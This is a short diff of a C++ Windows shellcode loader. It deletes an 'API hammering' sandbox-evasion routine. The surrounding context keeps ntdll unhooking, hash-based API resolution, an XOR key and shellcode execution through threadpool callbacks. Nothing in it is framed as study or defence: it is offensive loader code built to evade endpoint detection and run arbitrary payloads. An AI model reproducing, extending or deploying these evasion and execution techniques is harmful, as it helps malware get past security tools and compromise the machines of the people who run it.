@@ -6,7 +6,6 @@
 #include <winternl.h>
 #include <threadpoolapiset.h>
 #include <unordered_map>
-#include <thread>
 
 #pragma comment(lib, "ntdll.lib")
 
@@ -130,19 +129,6 @@ void UnhookNtdll() {
     CloseHandle(hFile);
 }
 
-void APIHammering() {
-    DWORD hashSleep = HashString("Sleep");
-    FARPROC pSleep = ResolveAPI(hashSleep);
-
-    std::thread hammeringThread([pSleep]() {
-        while (true) {
-            reinterpret_cast<void(WINAPI*)(DWORD)>(pSleep)(10);
-        }
-        });
-
-    hammeringThread.detach();
-}
-
 void ExecuteShellcodeWithThreadpool(const std::vector<unsigned char>& shellcode) {
     void* execMemory = VirtualAlloc(
         nullptr,
@@ -201,7 +187,6 @@ int main() {
     const unsigned char key = 0x5A;
 
     UnhookNtdll();
-    APIHammering();
 
     std::ifstream file(filename, std::ios::binary);
     if (!file.is_open()) {
